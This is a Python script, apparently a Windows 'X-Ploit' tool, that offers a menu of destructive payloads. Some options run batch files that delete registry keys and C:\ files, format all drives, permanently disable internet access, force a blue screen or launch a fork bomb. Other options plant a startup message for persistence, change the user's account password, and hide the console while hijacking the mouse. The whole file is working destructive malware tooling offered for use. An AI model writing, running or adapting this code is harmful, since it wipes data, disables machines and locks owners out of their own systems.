import os
from rx7 import style,wait,write,files,cls
import subprocess
import pkg_resources.py2_warn





XPL_EX=False

print('''
     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
     ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
     █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
     ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
     ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
''')
print('''
        1) BOMBER Application
        2) BOMBER Folder
        3) BOMBER User
        4) DELETE Registery (Keys&Values)
        5) DELETE C:\ Files
        6) DISABLE Internet
        7) DISABLE Internet (Premanetly)
        8) Format All Drivess
        9) Blue-Death Screen
       10) CPU Destroyer (Fork Bomb (%0%0)) 
       11) Startup Message
       12) Change Account Password (NEED ADMIN RIGHTS)
       13) Destroy  'Desktop'  &  'File Explorer'
     ''')
INP= input(' Enter Exploit Number: ')
if INP=='99':
     exit()
elif INP in [str(nom) for nom in range(1,11)]:
     EXPLOITS_LISTS= ['BOMBER Application','BOMBER Folder','BOMBER User','DELETE Registery','DELETE C',
                      'DISABLE Internet','DISABLE Internet Premanetly','Format All Drives','Blue-Death Screen'
                      'CPU - ForkBomb (%0%0)']
     EXP_DICT={str(i):EXPLOITS_LISTS[i-1] for i in range(1,10)}

     #def rename2noext(file= EXP_DICT[INP]):
     #     files.rename(f'./V/{EXP_DICT[INP]}.bat', f'./V/{EXP_DICT[INP]}')
     #import atexit
     #atexit.register(rename2noext)

     print(EXP_DICT[INP])
     input('OK?')
     files.rename(f'./V/{EXP_DICT[INP]}',f'./V/{EXP_DICT[INP]}.bat')
     #subprocess.getoutput(f'start "" "./V/{EXP_DICT[INP]}.bat"')
     subprocess.check_output(f'start "" "./V/{EXP_DICT[INP]}.bat"')
     files.rename(f'./V/{EXP_DICT[INP]}.bat', f'./V/{EXP_DICT[INP]}')
elif INP=='11':
     cls()
     print(' 1) Terminal       2) GUI [DEFAULT]:          ',end='')
     style.switch('green')
     TYPE= input()
     style.switch_default()
     if not TYPE: TYPE='2'
     TITLE= ''
     print(' Enter Name [X-Ploit]:                   ',end='')
     style.switch('green')
     TITLE= input()
     style.switch_default()
     if not TITLE: TITLE='X-Ploit'
     print(' Enter Message: [DEVICE IS INVOLVED BY "PHUX:X-PLOIT]               ',end='')
     style.switch('green')
     MSG= input()
     style.switch_default()
     if not MSG: MSG= 'DEVICE IS INVOLVED BY "PHUX:X-PLOIT"'
     if TYPE=='2':
          print('Enter Display Time:       ',end='')
          style.switch('green')
          TIME= input()
          style.switch_default()  
          try:    TIME= str(int(TIME))
          except: TIME= '5'
     if TYPE=='2':
          FILE_CONTENT= f'''@echo off
                            msg /time:{TIME} * /v {MSG} '''
     if TYPE=='1':
          FILE_CONTENT= f'''@echo off
                            title {TITLE}
                            echo {MSG}
                            echo {'-+'*(len(MSG)//2+1)}
                            pause '''
     write(f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{TITLE}.bat',text=FILE_CONTENT)
elif INP=='12':
    CFAR= subprocess.getoutput('net session')
    if not CFAR.startswith('There are no entries in the list.\n'):
        style.print('This Feature Needs Admin Rights.\n ',end='',color='red')
        os.system('pause')
        exit()
    import pyautogui
    NEW_PASS= input(' Enter New Password:  ')
    if not NEW_PASS:
        os.system('start ""')
        wait(1)
        pyautogui.typewrite(f'net user {os.getlogin()} *')
        pyautogui.press('enter')
        pyautogui.press('enter')
        pyautogui.press('enter') 
        wait(0.5)
        pyautogui.hotkey('alt','f4')
    else:
        if subprocess.getstatusoutput(f'net user {os.getlogin()} {NEW_PASS}')[0] == 0:
            print('Password Has Been Changed Successfully.')

elif INP=='13':
     def Hide_or_Destroy():
          import win32api, win32process, win32gui
          def callback(hwnd, pid):
               if win32process.GetWindowThreadProcessId(hwnd)[1] == pid:
                    # hide window
                    win32gui.ShowWindow(hwnd, 0)
          # find hwnd of parent process, which is the cmd.exe window
          win32gui.EnumWindows(callback, os.getppid())
     Hide_or_Destroy()
     import time, random, pyautogui
     def move_mouse(how_long_in_seconds):
          start_time = time.time()
          time_elapsed = time.time() - start_time
          xsize, ysize = pyautogui.size() 
          while time_elapsed < how_long_in_seconds:
              x, y = random.randrange(xsize), random.randrange(ysize)
              pyautogui.moveTo(x, y, duration=0.05)
              time_elapsed = time.time() - start_time
     move_mouse(60)





# whoami /groups | findstr /c:" S-1-5-32-544 " | findstr /c:" Enabled group" && goto :isadministrator
# whoami /groups | find "S-1-16-12288" && Echo I am running elevated, so I must be an admin anyway ;-)
# whoami /groups | find "S-1-5-32-544" && Echo I am a local admin